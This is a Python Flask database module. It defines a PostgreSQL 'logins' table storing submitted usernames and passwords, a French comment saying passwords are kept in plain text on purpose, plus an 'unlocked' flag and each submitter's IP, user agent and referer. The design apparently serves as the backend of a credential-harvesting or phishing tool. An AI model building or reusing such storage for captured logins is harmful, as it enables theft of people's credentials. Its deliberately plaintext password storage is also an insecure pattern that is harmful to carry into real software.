import psycopg
from flask import current_app, g
from psycopg.rows import dict_row

SCHEMA = """
CREATE TABLE IF NOT EXISTS logins (
    id           BIGSERIAL PRIMARY KEY,
    token        TEXT NOT NULL UNIQUE,
    identifiant  TEXT NOT NULL,
    mot_de_passe TEXT NOT NULL,          -- EN CLAIR, volontairement
    debloque     BOOLEAN NOT NULL DEFAULT FALSE,
    ua           TEXT,
    ip           TEXT,
    referer      TEXT,
    recu_le      TIMESTAMPTZ NOT NULL DEFAULT now()
);
CREATE INDEX IF NOT EXISTS idx_logins_recu ON logins(recu_le DESC);
"""


def get_db():
    if "db" not in g:
        g.db = psycopg.connect(current_app.config["DATABASE_URL"],
                               row_factory=dict_row)
    return g.db


def close_db(exc=None):
    db = g.pop("db", None)
    if db is not None:
        db.close()


def init_db():
    with psycopg.connect(current_app.config["DATABASE_URL"]) as con:
        con.execute(SCHEMA)


def init_app(app):
    app.teardown_appcontext(close_db)
    with app.app_context():
        init_db()